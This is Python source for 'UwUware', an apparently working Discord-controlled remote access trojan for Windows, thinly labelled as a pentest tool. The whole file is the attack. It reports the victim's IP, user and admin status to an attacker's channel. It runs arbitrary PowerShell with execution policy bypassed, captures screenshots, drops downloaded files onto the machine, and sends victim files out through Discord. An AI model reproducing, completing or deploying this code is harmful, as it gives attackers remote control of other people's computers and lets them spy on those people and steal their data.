# UwUware
#by @dankoreo69

import subprocess, sys, os, json, ctypes, platform, io, urllib
from datetime import datetime

# config
bot_token = "" #yor bot token
channel_id = ""       #channel id
allowed_users = ['']    #ur user id


try:
    import discord
    from discord.ext import commands
    from discord.colour import Color
    from PIL import ImageGrab
    import cv2
    import numpy as np
except ImportError:
    pass

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bots = {}

# Sys info after config
client_id = os.path.basename(sys.argv[0]) if sys.argv else f"pentest_{os.getpid()}.exe"
client_user = subprocess.check_output("whoami", shell=True, stderr=subprocess.DEVNULL).decode().strip()
client_os = f"{platform.system()} {platform.release()}"
is_admin = ctypes.windll.shell32.IsUserAnAdmin()
client_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()

try:
    ipinfo = json.loads(subprocess.check_output("powershell -c \"(Invoke-RestMethod 'ipinfo.io/json')\"", 
                                              shell=True, stderr=subprocess.DEVNULL).decode())
    client_ip = ipinfo.get('ip', 'unknown')
except: pass

current_dir = os.getcwd()
bots[client_id] = {
    'ip': client_ip, 'user': client_user, 'os': client_os, 
    'admin': is_admin, 'dir': current_dir, 'channel': channel_id
}

@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    if channel:
        embed = discord.Embed(title=f"🟢 PENTEST {client_id} ONLINE", color=Color.green())
        embed.add_field(name="🌐 IP", value=client_ip)
        embed.add_field(name="👤 User", value=client_user)
        embed.add_field(name="👑 Admin", value="✅" if is_admin else "❌")
        embed.add_field(name="💻 OS", value=client_os)
        embed.add_field(name="📁 CWD", value=current_dir)
        await channel.send(embed=embed)
    print(f"[+] {client_id} connected successfully!")

def authorized(ctx):
    return str(ctx.author.id) in [str(uid) for uid in allowed_users]

def save_long_output(command, output):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"pentest_output_{timestamp}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Pentest Command: {command}\n")
        f.write("="*60 + "\n\n")
        f.write(output)
    return filename

@bot.command()
async def ping(ctx):
    await ctx.send(f"🏓 **{client_id}**: {round(bot.latency*1000)}ms | Admin: {'✅' if is_admin else '❌'}")

@bot.command()
async def list(ctx):
    if not authorized(ctx):
        return

    # build the embed for the current implant (client)
    embed = discord.Embed(
        title=f"🟢 PENTEST {client_id} ONLINE",
        color=discord.Color.green()
    )
    embed.add_field(name="🌐 IP", value=client_ip)
    embed.add_field(name="👤 User", value=client_user)
    embed.add_field(name="👑 Admin", value="✅" if is_admin else "❌")
    embed.add_field(name="💻 OS", value=client_os)
    embed.add_field(name="📁 CWD", value=current_dir)

    # add a separator field (optional, improves readability)
    embed.add_field(name="\u200b", value="**Other connected implants:**", inline=False)

    # loop through other bots (assuming `bots` dict contains all except current)
    if bots:
        for bot_id, info in bots.items():
            status = "👑" if info.get('admin', False) else "👤"
            embed.add_field(
                name=f"{status} {bot_id}",
                value=info.get('ip', 'Unknown IP'),
                inline=True
            )
    else:
        embed.add_field(name="No other bots", value="No connected implants", inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def cd(ctx, *, path: str = None):
    global current_dir
    if not authorized(ctx): return
    try:
        if path:
            os.chdir(path)
            current_dir = os.getcwd()
            bots[client_id]['dir'] = current_dir
            await ctx.send(f"📁 **CWD**: `{current_dir}`")
        else:
            await ctx.send(f"📁 **Current**: `{current_dir}`")
    except Exception as e:
        await ctx.send(f"❌ **CD failed**: {e}")

@bot.command()
async def cmd(ctx, *, command: str = None):
    if not authorized(ctx) or not command: 
        await ctx.send("❌ Usage: `!cmd whoami`")
        return
    try:
        ps_cmd = command.replace('"', '\\"').replace("$", "`$")
        result = subprocess.run(
            f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{ps_cmd}"',
            shell=True, capture_output=True, text=True, timeout=25, 
            encoding='utf-8', errors='replace', cwd=current_dir
        )
        output = (result.stdout + result.stderr).strip()
        if len(output) > 1900:
            filename = save_long_output(command, output)
            await ctx.send(f"📄 **{command}** (long output)", file=discord.File(filename))
            os.remove(filename)
        else:
            embed = discord.Embed(title=f"💻 `{command}`", color=Color.green())
            embed.add_field(name="📂 Directory", value=current_dir)
            embed.add_field(name="Output", value=f"```{output}```", inline=False)
            await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await ctx.send(f"⏰ **`{command}`** timeout (25s)")
    except Exception as e:
        await ctx.send(f"💥 **`{command}`** error: {str(e)}")

@bot.command()
async def screenshot(ctx):
    if not authorized(ctx): return
    try:
        screenshot = ImageGrab.grab()
        bio = io.BytesIO()
        screenshot.save(bio, 'PNG')
        bio.seek(0)
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%H%M%S')}.png"
        await ctx.send(f"📸 **Screenshot from {client_id}**", file=discord.File(bio, filename))
    except Exception as e:
        await ctx.send(f"📸 **Screenshot failed**: {e}")


@bot.command()
async def upload(ctx):
    if not authorized(ctx) or not ctx.message.attachments: return
    url, name = ctx.message.attachments[0].url, ctx.message.attachments[0].filename
    try:
        subprocess.run(f'powershell -c "iWR \'{url}\' -o \'{name}\'"', shell=True, cwd=current_dir)
        await ctx.send(f"📤 **`{name}`** uploaded to `{current_dir}`")
    except Exception as e:
        await ctx.send(f"📤 **Upload failed**: {e}")

@bot.command()
async def download(ctx, *, path: str):
    if not authorized(ctx): return
    if os.path.exists(path):
        size = os.path.getsize(path)
        if size < 8000000:
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send(f"📄 **`{path}`** too large ({size:,} bytes)")
    else:
        await ctx.send(f"❌ **`{path}`** not found")

@bot.command()
async def kill(ctx):
    if authorized(ctx):
        await ctx.send(f"💀 **{client_id}** terminated")
        sys.exit(0)

if __name__ == "__main__":
    bot.run(bot_token)